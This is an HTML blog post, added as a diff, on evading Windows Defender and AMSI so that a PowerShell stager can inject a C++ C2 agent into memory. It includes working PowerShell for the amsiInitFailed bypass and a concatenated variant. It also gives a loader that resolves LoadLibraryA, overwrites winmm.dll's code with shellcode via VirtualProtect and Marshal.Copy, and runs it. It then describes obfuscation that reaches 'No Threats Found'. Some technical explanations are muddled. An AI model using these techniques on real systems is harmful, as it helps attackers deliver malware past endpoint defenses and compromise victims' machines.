@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mastering Reflective Memory Injection + Evade AMSI | xenon </title>
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/favicon.jpg" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <nav>
+        <div class="container nav-flex">
+            <div class="logo">
+                <a href="index.html" style="text-decoration: none; color: inherit;">XENON</a>
+            </div>
+            <ul class="nav-links">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="blog.html">Blog</a></li>
+                <li><a href="contact.html">Contact</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <article class="container" style="padding: 60px 0;">
+        
+        <header style="margin-bottom: 40px;">
+            <h1 style="color: var(--accent); font-size: 2.5rem;">Mastering Reflective Memory Injection + Evade AMSI</h1>
+            <p style="color: var(--dim-text);">[Category e.g., Malware, Exploitation] | [Mar 12, 2026]</p>
+        </header>
+
+        <section class="post-content">
+           
+            <h2 class="section-label" style="margin-top: 40px;">Introduction</h2>
+            <p>In the modern endpoint security, staging a malware or execute a binary on a disk become easy to detect. Specially malwares written in C/C++ because these Security tools like Windows Defender/AMSI and EDR system trained on these legacy language binaries unlike the modern one like Go,Rust etc. </p>
+
+            <p>So, This research explains Reflective Memory Injection and how to evade AMSI detection for a module written in C++ and then later staged using powershell.</p>
+
+
+            <h2 class="section-label" style="margin-top: 40px;">How Static Analysis and Submission Work </h2>
+            <p>Before diving into the exploitation process, we first need to understand how Windows Defender analyzes files.</p>
+            
+            <p><b>The "Write-to-Disk" Trigger</b>: Every time a file is created or modified, the Windows kernel triggers a callback to the Antimalware filter driver. This initiates a scan before the file is executed.</p>
+
+            <p><b>Signature Extraction </b>: Windows Defender decomposes the file, identifying key sections (like .text, .data, and the Import Address Table). It generates a "fingerprint" based on these structures.</p>
+
+            <p><b>Matching and Analysis </b>: If the static signature matches a known threat, the file is blocked. If the signature is unknown but looks "sus" (e.g., high entropy or sus functions like VirtualAlloc), Defender often flags it as a "Trojan" or "Backdoor" based on its heuristic model or behavior.</p>
+
+            <p><b>Automatic Sample Submission</b>: If a file is flagged as suspicious, it may be automatically submitted to Microsoft's cloud for further analysis. For most of windows systems, this is done automatically. But as a researcher, you might want to turn off auto sample submission.</p>
+
+            <div class="image-placeholder">
+                <img src="assets/images/auto_sample_submission.png" alt="Auto Sample Submission">
+            </div>
+
+            <h2 class="section-label">Resources and Tooling</h2>
+           <ul class="tool-list">
+                <li>
+                    <a href="https://github.com/rasta-mouse/ThreatCheck/" target="_blank" class="cyber-link">Threat Check</a>
+                    <span class="desc"> -Project by Rasta-Mouse Analyzes a given binary and identify bytes that trigger the engine to flag it</span>
+                </li>
+                <li>
+                    <a href="https://github.com/TheWover/donut" target="_blank" class="cyber-link">Donut Shellcode</a>
+                </li>
+                <li class="text-only">
+                    <b>SQL Agent written in C++. I tried this approach with my soon to be released C2 framework.</b>
+                </li>
+                 <li class="text-only">
+                    <b>Powershell:</b> The stager.
+                </li>
+                <li class="text-only">
+                    Python3 which can be used for the shellcoding and serve the stager later on.
+                </li>
+            </ul>
+
+            <h2 class="section-label">Anatomy of the Blocked Stager</h2>
+            <p>In our initial approach, we were writing a script to disk (original_sql_srv.ps1) and then executing it. Modern Windows security (Windows Defender/AMSI) isn't just looking for "viruses"; it is performing Static Analysis. </p>
+
+            <p>When the file hits the disk, the AMSI triggers immediately. It looks at the file content and compares it against a database of known malicious patterns or signatures and more importantly identifies its "dangerous" behaviors. Our original script was flagged because it contained common patterns used by loaders. So for this we'll use a Threat Check application</p>
+
+             <div class="image-placeholder">
+                <img src="assets/images/original_flagged.png" alt="Original Script Flagged">
+            </div>
+
+                <p>As you can see, the script is flagged so lets find out which byte is causing the engine to flag it</p>
+
+                <div class="image-placeholder">
+                <img src="assets/images/first_flagged.png" alt="Original Script Flagged">
+            </div>
+
+            <p>The Triggered End of bad byte offset at: <b>0x113</b>. It happens b/c AMSI matchs this characters to the existing signature</p>
+
+             <pre class="terminal-body" style="background: #000; color: #fff; font-size: 13px;">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')</pre>
+            
+             <p>SetValue($null,$true) call is the final "bad byte" in that sequence. Once the engine sees the target (AmsiUtils) and the action (SetValue of amsiInitFailed), it creates an AmsiResultDetected event before the script ever executes.</p>
+         
+
+           
+            <h2 class="section-label">String Reversing</h2>
+            <p>AMSI detects simple string-based bypasses, like reversing a malicious string, because modern providers such as Windows Defender and AMSI use a dynamic analysis and emulation to evaluate the script's behavior before execution.</p>
+
+            <p>Simply, when the string reversed version of the stager is executed, it will detect the strings at a runtime</p>
+
+             <div class="image-placeholder">
+                <img src="assets/images/string_reverse.png" alt="String Reversing">
+            </div>
+
+               
+
+            <p>The Triggered End of bad byte offset at: <b>0x1AF</b>. The moment our script run it reconstructs the reversed string System.Management.Automation.AmsiUtils in the emulator’s memory, the engine flags it as malicious, which was already compared to the existed signature. </p>
+
+
+             <h2 class="section-label">String Concatenation</h2>
+            <p>This concept is almost same as string reversing, but instead of reversing the string, we concatenate multiple strings to form the malicious stager.</p>
+
+            <div class="image-placeholder">
+                <img src="assets/images/string_concat.png" alt="String Concatenation">
+            </div>
+
+            <p>As a expected, the concatenated string get flagged again because AMSI perform most of its analysis at runtime.</p>
+
+            <div style="background-color: #1e1e1e; padding: 20px; border-radius: 8px; font-family: 'Consolas', 'Monaco', monospace; line-height: 1.5; color: #d4d4d4; border: 1px solid #3c3c3c; overflow-x: auto; margin: 20px 0;">
+    <div><span style="color: #9cdcfe;">$s1</span> = <span style="color: #ce9178;">'System.Management.Automation.A'</span> + <span style="color: #ce9178;">'msi'</span> + <span style="color: #ce9178;">'Utils'</span></div>
+    <div><span style="color: #9cdcfe;">$s2</span> = <span style="color: #ce9178;">'amsi'</span> + <span style="color: #ce9178;">'Init'</span> + <span style="color: #ce9178;">'Failed'</span></div>
+    <div><span style="color: #9cdcfe;">$m</span> = [<span style="color: #4ec9b0;">Ref</span>].Assembly.GetType(<span style="color: #9cdcfe;">$s1</span>).GetField(<span style="color: #9cdcfe;">$s2</span>, <span style="color: #ce9178;">'NonPublic,Static'</span>)</div>
+    <div><span style="color: #9cdcfe;">$m</span>.SetValue(<span style="color: #569cd6;">$null</span>, <span style="color: #569cd6;">$true</span>)</div>
+</div>
+
+           
+
+             <h2 class="section-label">Hex Encoding</h2>
+            <p>The hex encoding method flagged becuase hex-encoding the strings wasn't enough because the AMSI engine is now pattern-matching the conversion logic itself.</p>
+
+             <div class="image-placeholder">
+                <img src="assets/images/hex_encoding.png" alt="Hex Encoding">
+            </div>
+
+        <p>Even though we encode the "malicious strings" (AmsiUtils, amsiInitFailed), the engine looked at the context of the code. It saw a pattern of:</p>
+
+                <ul>
+                <li>Getting a reference to a non-public, static field.</li>
+                <li>Calling SetValue on that field with $true.</li>
+                </ul>
+
+
+             <h2 class="section-label">Reflective Memory Injection</h2>
+
+            <p>We confirmed either we concatenate/reverse the strings or use hex encoding, but the AMSI engine still flags it. because it analyses the context of the code. so lets move on to <b>Runtime Integrated Memory Injection.</b></p>
+
+                <ul>
+            <p><li><b>Assembly Enumeration (GetAssemblies())</b>: Instead of importing System.Management.Automation (which the EDR monitors as a high-risk indicator), you are querying the AppDomain for already-loaded assemblies. because querying existing memory is a legitimate runtime task. It avoids triggering the Assembly Load event</li></p>
+
+            <div style="background-color: #1e1e1e; padding: 20px; border-radius: 8px; font-family: 'Consolas', 'Monaco', monospace; line-height: 1.5; color: #d4d4d4; border: 1px solid #3c3c3c; overflow-x: auto; margin: 20px 0;">
+    <div><span style="color: #9cdcfe;">$Assemblies</span> = [<span style="color: #4ec9b0;">AppDomain</span>]::CurrentDomain.GetAssemblies()</div>
+    <div><span style="color: #c586c0;">foreach</span> (<span style="color: #9cdcfe;">$A</span> <span style="color: #c586c0;">in</span> <span style="color: #9cdcfe;">$Assemblies</span>) {</div>
+    <div style="padding-left: 20px;"><span style="color: #c586c0;">if</span> (<span style="color: #9cdcfe;">$A</span>.GlobalAssemblyCache -and (<span style="color: #9cdcfe;">$A</span>.Location.Split(<span style="color: #ce9178;">'\\'</span>)[-1].Equals(<span style="color: #ce9178;">'System.dll'</span>))) {</div>
+    <div style="padding-left: 40px;"><span style="color: #9cdcfe;">$zoakb</span> = <span style="color: #9cdcfe;">$A</span>.GetType(<span style="color: #ce9178;">'Microsoft.Win32.UnsafeNativeMethods'</span>)</div>
+    <div style="padding-left: 40px;"><span style="color: #9cdcfe;">$G</span> = <span style="color: #9cdcfe;">$zoakb</span>.GetMethod(<span style="color: #ce9178;">'GetModuleHandle'</span>)</div>
+    <div style="padding-left: 40px;"><span style="color: #9cdcfe;">$GP</span> = <span style="color: #9cdcfe;">$zoakb</span>.GetMethod(<span style="color: #ce9178;">'GetProcAddress'</span>)</div>
+    <div style="padding-left: 40px;"><span style="color: #9cdcfe;">$hK</span> = <span style="color: #9cdcfe;">$G</span>.Invoke(<span style="color: #569cd6;">$null</span>, @(<span style="color: #ce9178;">"kernel32.dll"</span>))</div>
+    <div style="padding-left: 40px;"><span style="color: #9cdcfe;">$hL</span> = <span style="color: #9cdcfe;">$GP</span>.Invoke(<span style="color: #569cd6;">$null</span>, @(<span style="color: #9cdcfe;">$hK</span>, <span style="color: #ce9178;">"LoadLibraryA"</span>))</div>
+    <div style="padding-left: 40px;"><span style="color: #c586c0;">break</span></div>
+    <div style="padding-left: 20px;">}</div>
+    <div>}</div>
+</div>
+
+            <p><li><b>Hijacking UnsafeNativeMethods</b>: You are tapping into an internal class used by the CLR to bridge managed code (PowerShell) to unmanaged code (Windows API).</li></p>
+
+           <div style="background-color: #252526; border-left: 4px solid #007acc; padding: 15px 20px; margin: 30px 0; border-radius: 0 4px 4px 0; color: #cccccc; font-size: 0.95rem; line-height: 1.6;">
+    <strong style="color: #ffffff; display: block; margin-bottom: 5px; font-style: normal;">Managed vs. Unmanaged Code</strong>
+    Managed code is code that runs under the control of the given runtime. For example, in the .NET runtime, C/C++ are referred to as <b>unmanaged code</b>. Conversely, for the Windows native runtime/Windows API, programming languages like C# and VBScript are referred to as <b>unmanaged code</b>.
+</div>
+
+            <p><li><b>The "Trojan" Memory Strategy (winmm.dll)</b>: We aren't requesting new memory via VirtualAlloc. we are loading a legitimate system library and overwriting its code space in RAM.</li></p>
+
+           <div style="background-color: #1e1e1e; padding: 20px; border-radius: 8px; font-family: 'Consolas', 'Monaco', monospace; line-height: 1.5; color: #d4d4d4; border: 1px solid #3c3c3c; overflow-x: auto; margin: 20px 0;">
+    <div><span style="color: #9cdcfe;">$LL</span> = [<span style="color: #4ec9b0;">Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span style="color: #9cdcfe;">$hL</span>, [<span style="color: #4ec9b0;">Func[String, IntPtr]</span>])</div>
+    <div><span style="color: #9cdcfe;">$h</span> = <span style="color: #9cdcfe;">$LL</span>.Invoke(<span style="color: #ce9178;">"winmm.dll"</span>)</div>
+    <div><span style="color: #9cdcfe;">$o</span> = <span style="color: #b5cea8;">0</span></div>
+    <br>
+    <div><span style="color: #9cdcfe;">$zoakb</span>.GetMethod(<span style="color: #ce9178;">'VirtualProtect'</span>).Invoke(<span style="color: #569cd6;">$null</span>, @(<span style="color: #9cdcfe;">$h</span>, [<span style="color: #4ec9b0;">UInt32</span>]<span style="color: #9cdcfe;">$wghxf</span>.Length, [<span style="color: #4ec9b0;">UInt32</span>]<span style="color: #b5cea8;">0x04</span>, [<span style="color: #c586c0;">ref</span>]<span style="color: #9cdcfe;">$o</span>))</div>
+    <div>[<span style="color: #4ec9b0;">System.Runtime.InteropServices.Marshal</span>]::Copy(<span style="color: #9cdcfe;">$wghxf</span>, <span style="color: #b5cea8;">0</span>, <span style="color: #9cdcfe;">$h</span>, <span style="color: #9cdcfe;">$wghxf</span>.Length)</div>
+    <div><span style="color: #9cdcfe;">$zoakb</span>.GetMethod(<span style="color: #ce9178;">'VirtualProtect'</span>).Invoke(<span style="color: #569cd6;">$null</span>, @(<span style="color: #9cdcfe;">$h</span>, [<span style="color: #4ec9b0;">UInt32</span>]<span style="color: #9cdcfe;">$wghxf</span>.Length, [<span style="color: #4ec9b0;">UInt32</span>]<span style="color: #b5cea8;">0x20</span>, [<span style="color: #c586c0;">ref</span>]<span style="color: #9cdcfe;">$o</span>))</div>
+</div>
+</div>
+
+              <p><li><b>Marshal::GetDelegateForFunctionPointer</b>: the engine cannot see a link between your script and the VirtualProtect call because you are invoking it through a generic function pointer, masking the call path.</li></p>
+          
+
+            <div style="background-color: #1e1e1e; padding: 20px; border-radius: 8px; font-family: 'Consolas', 'Monaco', monospace; line-height: 1.5; color: #d4d4d4; border: 1px solid #3c3c3c; overflow-x: auto; margin: 20px 0;">
+    <div><span style="color: #9cdcfe;">$i</span> = [<span style="color: #4ec9b0;">Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span style="color: #9cdcfe;">$h</span>, [<span style="color: #4ec9b0;">Action</span>])</div>
+    <div><span style="color: #9cdcfe;">$i</span>.Invoke(<span style="color: #9cdcfe;">$args</span>)</div>
+</div>
+  </ul>
+
+             <div class="image-placeholder">
+                <img src="assets/images/injection_part.png" alt="Injection Part">
+            </div>
+
+            <p>The latest scan triggered at 0x419 because, despite our pointer resolution approach, the static signature of the SetValue action still existed in the file.The problem is even though you hex-encoded the string, the method call SetValue is a static keyword in the script.
+Thus we need to invoke SetValue using the same "Dynamic Delegate" pattern you used for VirtualProtect. By stripping the keyword SetValue from the stager source</p>
+            
+
+             <h2 class="section-label">Indirect Method Invocation</h2>
+            <p>In PowerShell, methods can be called as strings. Instead of the loud, static [Ref].Assembly.GetType(), we used:</p>
+
+             <pre class="terminal-body" style="background: #000; color: #fff; font-size: 13px;">$obj."$methodName"($argument)</pre>
+
+            <p>To the static scanner, this is no longer a method call; it is a variable property accessor.</p>
+            <p><b>GetType, GetField, and SetValue</b> are completely removed from the script's plaintext. They only exist as hex arrays, which are reconstructed in memory at the exact millisecond of execution.</p>
+
+            <h3 style="color: #ffffff; font-size: 18px;">The Final Logic</h3>
+
+            <p>Lets devide them as a level and we call each step by their step level</p>
+            <ul>
+                <li>Step A: Get a reference to an assembly.</li>
+                <li>Step B: Get a private field.</li>
+                 <li>Step C: Set that field to true.</li>
+            </ul>
+
+            <p>
+                By Hex-encoding + Randomized variables, we fragmented the chain. The engine sees a hex array being joined (Step A), but it doesn't know that the resulting string will be used as a method name (Step B) until the script is already running because the method name is dynamically constructed in memory at runtime instead of intialization it as a string variables. This effectively defeats the Emulation phase of AMSI, which is where the engine tries to predict the behavior of the script before it runs.
+            </p>
+
+            <h3 style="color: #ffffff; font-size: 18px;">The Polymorphic Entropy</h3>
+            <ul>
+                <li>
+                    <b>Variable Randomization:</b> The script replaces identifiers like $v_get_type with random strings (e.g., $xjqwkz). This prevents signature-based detection that looks for specific variable names.
+                </li>
+                <li><b>XOR Keys:</b> The shellcode is encrypted with a new random key every time.</li>
+            </ul>
+
+             <div class="image-placeholder">
+                <img src="assets/images/no_threats_found.png" alt="No Threats Found">
+            </div>
+
+             <div class="image-placeholder">
+                <img src="assets/images/run_check.png" alt="No Threats Found">
+            </div>
+
+               
+
+            <p>The whole research from original_sql_srv.ps1 (Detected) to the final version (Evaded) confirms the power of Advanced Reflective Memory Injection. that by the final stage, we able to evade a obfuscated powershell stager within legitimate-looking .NET operations + calling methods at runtime. This approach effectively bypasses defender engines their heuristic security models.</p>
+
+
+             <div style="background-color: #252526; border-left: 4px solid #007acc; padding: 15px 20px; margin: 30px 0; border-radius: 0 4px 4px 0; color: #cccccc; font-size: 0.95rem; line-height: 1.6;">
+                Most of AMSI detections are based on behavior patterns rather then signatures. So, even if you change the string or the method name, if the behavior of the script matches a known malicious pattern (like calling SetValue on a field named amsiInitFailed), it can still be flagged. since they analyzes at runtime by the time the strings are reconstructed. they may likely flagged it as malicious. This is why we had to go beyond just obfuscating strings and also change how we invoke methods to truly evade detection.
+</div>
+
+        
+        </section>
+
+        <div style="margin-top: 60px;">
+            <a href="blog.html" class="btn-block" style="text-decoration: none; display: inline-block; width: auto; padding: 10px 30px;">&larr; Return to Archive</a>
+        </div>
+    </article>
+
+    <footer>
+       <p>&copy; 2026. Security Research Archive.</p>
+    </footer>
+</body>
+</html>
